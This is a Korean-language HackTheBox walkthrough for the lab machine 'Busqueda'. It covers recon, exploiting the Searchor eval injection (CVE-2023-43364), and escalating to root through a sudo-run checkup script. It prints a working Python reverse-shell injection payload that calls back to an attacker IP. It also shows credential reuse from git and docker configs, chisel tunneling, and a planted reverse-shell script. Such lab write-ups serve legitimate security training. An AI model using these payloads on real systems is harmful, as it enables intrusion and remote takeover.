# Busqueda - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA Busqueda 10.10.11.208
```
<img width="1104" height="288" alt="image" src="https://github.com/user-attachments/assets/66f2176c-ae71-47fe-bd10-9f109bb26235" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `searcher.htb`등록.
<img width="1104" height="65" alt="image" src="https://github.com/user-attachments/assets/edb5b33b-c6ad-4c83-b8c2-a142097436e3" />

### banner grabbing
```bash
whatweb http://searcher.htb

curl -IL http://searcher.htb
```
<img width="1104" height="251" alt="image" src="https://github.com/user-attachments/assets/57ae4f95-a937-4317-b614-48823b9fed1b" />

### CVE-2023-43364
- https://nvd.nist.gov/vuln/detail/cve-2023-43364
<img width="1100" height="385" alt="image" src="https://github.com/user-attachments/assets/7c276865-5a04-4f1a-9d51-e34d62d6e368" />

<br>
<br>

- https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b
- `main.py`에서 `eval`함수로 인해서 명령어를 실행할 수 있는 취약점.
<img width="874" height="400" alt="image" src="https://github.com/user-attachments/assets/b205bf92-de22-4d9c-8d6c-1d0a7262a2f1" />

<br>
<br>

- https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
- 해당 POC에서는 `engine`파라미터에서 명령어를 실행하였는데, 소스코드에서는 `query`파라미터에서 명령어를 실행할 수 있는 것으로 보여 `query`파라미터에 URL로 인코딩하여 리버스 셸 명령어를 실행.
```python3
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.4',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```
<img width="774" height="396" alt="image" src="https://github.com/user-attachments/assets/5ba6a7f4-d102-4b2d-9923-5ed53ae6386c" />

<br>
<br>

- 셸 획득.
<img width="1105" height="142" alt="image" src="https://github.com/user-attachments/assets/171e1791-45ef-49a0-add5-4e799352b6ee" />

---
## Privesc
### Docker
- `/var/www/app/.git/config`에서 `cody` 계정 정보 발견.
<img width="1103" height="230" alt="image" src="https://github.com/user-attachments/assets/dc87922b-280c-496e-944a-a659d4b1f409" />

<br>
<br>

- `svc`유저의 비밀번호인지 시도.(svc:jh1usoih2bkjaspwe92)
<img width="1103" height="173" alt="image" src="https://github.com/user-attachments/assets/281cc834-2a68-457a-ac08-1522154bc9f1" />

<br>
<br>

- `system-checkup.py *`를 실행시키면 `docker`에 대한 명령어가 출력.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```
<img width="1103" height="130" alt="image" src="https://github.com/user-attachments/assets/bd873738-449a-4cf6-9d42-53c6fd2563e9" />

<br>
<br>

- https://docs.docker.com/reference/cli/docker/inspect/
- `docker-inspect`가 위의 링크와 비슷한거 같아서 실행.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json}}' 960873171e2e
```
<img width="1103" height="464" alt="image" src="https://github.com/user-attachments/assets/0b85c8f7-628c-4006-85fa-a65f6aca5d60" />

<br>
<br>

- 해당 `json`출력을 로컬로 가져와서 `jq`로 포맷.
- `mysql` 계정 발견.
```bash
cat text|jq
```
<img width="1103" height="544" alt="image" src="https://github.com/user-attachments/assets/12d331e3-47e7-4176-91c9-e671a7ff8715" />

<br>
<br>

- `gitea:yuiu1hoiu4i5ho1uh`로 `mysql` 로그인.
```bash
mysql -h127.0.0.1 -ugitea -p'yuiu1hoiu4i5ho1uh'
```
<img width="1103" height="267" alt="image" src="https://github.com/user-attachments/assets/cde351e7-4270-43ae-b2ed-679e855b7546" />

<br>
<br>

- `gitea` DB의 `user`테이블에서 `administrator`와 `cody` 계정 발견.
- 크래킹을 시도하였으나 실패.
<img width="1104" height="357" alt="image" src="https://github.com/user-attachments/assets/5dfe5f37-e26e-4b1a-b07f-2bc513cf8ca9" />

<br>
<br>

- 다른 image를 같은 방식으로 시도.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{jso}' f84a6b33fb5a
```
<img width="1104" height="241" alt="image" src="https://github.com/user-attachments/assets/29c8bc3d-0ad1-4e10-bd52-346a809f0063" />

<br>
<br>

- `jI86kGUuj87guWr3RyF` 비밀번호 발견.
<img width="1104" height="525" alt="image" src="https://github.com/user-attachments/assets/25a642d2-abca-4c41-b771-7a68e8f9da9a" />

<br>
<br>

- `full-checkup`명령어를 실행했으나 실행되지 않음.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
<img width="1104" height="48" alt="image" src="https://github.com/user-attachments/assets/2fe6adf4-7b58-45ad-b4c0-5da4a45add92" />

---
### Gitea
- 3000번 포트가 열려있어 확인하니 `Gitea`가 실행 중.
```bash
curl http://127.0.0.1:3000
```
<img width="1105" height="328" alt="image" src="https://github.com/user-attachments/assets/5bd0796e-1c0a-4a4d-ac2d-9afba15bf389" />

<br>
<br>

- 8000번 포트로 터널링 생성하여 3000번 포트 포워딩.
```bash
./chisel server --reverse -v -p 8000
```
<img width="1105" height="226" alt="image" src="https://github.com/user-attachments/assets/5d215b5b-8638-4602-9e01-74f915c2e800" />

<br>
<br>

```bash
./chisel client 10.10.16.4:8000 R:3000:127.0.0.1:3000
```
<img width="1104" height="66" alt="image" src="https://github.com/user-attachments/assets/b6aa4af1-3273-402a-9488-5815e64a67c3" />

<br>
<br>

- `Gitea` 접속.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/9bc0213d-86d4-47cb-b233-ed7f73133958" />

<br>
<br>

- `Explore > Users`에서 `cody` 유저와 `administrator`유저 발견.
<img width="1100" height="350" alt="image" src="https://github.com/user-attachments/assets/085df7ca-1ccb-48e8-8b48-89622f2b7b39" />

<br>
<br>

- `cody:jh1usoih2bkjaspwe92`, `administrator:yuiu1hoiu4i5ho1uh`로 로그인 성공.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/bd0fd3cf-0cf7-4f61-af3d-acda11961376" />

<br>
<br>

- `administrator/scripts/system-checkup.py`에서 이전에 실행했던 코드들을 확인.
<img width="704" height="731" alt="image" src="https://github.com/user-attachments/assets/1277c525-4be2-4c0c-bda2-24ff28cb070f" />

<br>
<br>

- 실행되지 않았던 `full-checkup`의 경우 현재 폴더에 `full-checkup.sh`가 필요하여 로컬에서 리버스 셸 코드를 만들어서 전달.
<img width="1104" height="89" alt="image" src="https://github.com/user-attachments/assets/c1019431-d620-4208-ae06-8e4ec597274a" />

<br>
<br>

- `full-checkup`실행.
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
<img width="1104" height="35" alt="image" src="https://github.com/user-attachments/assets/91b7b17b-2102-41e2-9c3a-dc30a291c44c" />

<br>
<br>

- 셸 획득.
<img width="1104" height="140" alt="image" src="https://github.com/user-attachments/assets/60fd7fbe-c2bb-4f99-ae97-5a86a315efbc" />

---
## FLAG
- `/home/svc/user.txt`
<img width="1104" height="310" alt="image" src="https://github.com/user-attachments/assets/1ace6405-f8a8-4071-b92d-966ff65551ac" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="384" alt="image" src="https://github.com/user-attachments/assets/0a6e73a7-e94d-4cd0-bdf0-e1c5bb4369c4" />
